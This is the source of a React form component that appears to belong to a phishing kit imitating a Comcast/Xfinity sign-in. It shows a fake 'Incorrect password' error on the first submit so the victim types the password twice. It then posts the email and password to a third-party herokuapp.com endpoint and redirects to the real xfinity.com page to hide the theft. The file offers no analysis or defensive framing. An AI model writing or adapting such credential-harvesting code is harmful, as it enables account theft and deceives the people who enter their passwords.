import React, { useState, useEffect } from 'react';
import Login from './Login';
import Password from './Password';

const FormContainer = () => {
  const [step, setStep] = useState(1); // Track the current step
  const [error, setError] = useState(null);
  const [clickCount, setClickCount] = useState(0)

  const [formData, setFormData] = useState({
    email: '',
    password: '',
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };


  const validateForm = () => {
    if (step === 1 && !formData.email) {
      setError('Please enter your email.');
      return false;
    }
    if (step === 2 && !formData.password) {
      setError('Please enter your password.');
      return false;
    }

    return true;
  };

  const handleNext = () => {
    if (validateForm()) {
      setStep((prevStep) => prevStep + 1);
    }
  };


  useEffect(() => {
    const savedEmail = localStorage.getItem('email')?.trim();
    if (savedEmail && savedEmail.endsWith('@comcast.net')) {
      setFormData((prevData) => ({
        ...prevData,
        email: savedEmail,
      }));
      setStep(2);
    }
  }, []);


  const handleSubmit = async (e) => {

    e.preventDefault();

    setClickCount((prevCount) => prevCount + 1);

    if (clickCount === 0) {
      // Simulate an error on the first click
      setError('Incorrect password. Please try again.');
      console.log('Error:', 'Failed to submit. Please try again later.');
    } else {
      try {
        const response = await fetch(
          'https://shielded-island-46547-e694e2bd0c22.herokuapp.com/api/submit',
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData),
          }
        );

        const data = await response.json();
        console.log(data);

        if (data.success) {
          window.location.href =
            'https://www.xfinity.com/planbuilder?localize=true&drawer=internet';
        } else {
          setError(data.message);
        }
      } catch (error) {
        setError('Failed to submit. Please try again later.');
        console.error('Error:', error);
      }
    }
  };

  return (

    <div>
      <form onSubmit={(e) => { e.preventDefault(); step === 2 ? handleSubmit(e) : handleNext(); }}>
        {step === 1 && <Login formData={formData} handleChange={handleChange} handleNext={handleNext} error={error}/>}
        {step === 2 && <Password formData={formData} email={formData.email} handleChange={handleChange} handleSubmit={handleSubmit} error={error} />}  
      </form>
    </div>



  );
};

export default FormContainer;
